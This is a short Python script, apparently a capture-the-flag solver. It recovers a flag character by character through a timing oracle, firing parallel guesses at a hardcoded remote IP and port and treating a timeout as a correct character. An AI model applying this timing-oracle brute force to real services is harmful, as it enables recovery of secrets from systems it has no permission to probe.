import string
import asyncio

async def oracle(c):
	reader, writer = await asyncio.open_connection("184.72.87.9", 8006)
	await reader.readline()
	writer.write(c.encode() + b"\n")
	await writer.drain()
	try:
		import time
		start = time.time()
		await asyncio.wait_for(reader.readuntil(b'wr'), timeout=40)
		end = time.time()
		print(c, end - start)
		writer.close()
		return (False, c)
	except TimeoutError:
		writer.close()
		return (True, c)

async def main():
	curr = "flag{i_wouldve_used_argon2_but_i_didnt_want_to_ki"
	for i in range(100):
		poss = [curr + c for c in string.ascii_lowercase + "_"]
		coros = [asyncio.create_task(oracle(p)) for p in poss]
		for coro in asyncio.as_completed(coros):
			result = await coro
			if result[0]:
				curr = result[1]
				for coro in coros:
					coro.cancel()
				break
		print(curr)

asyncio.run(main())
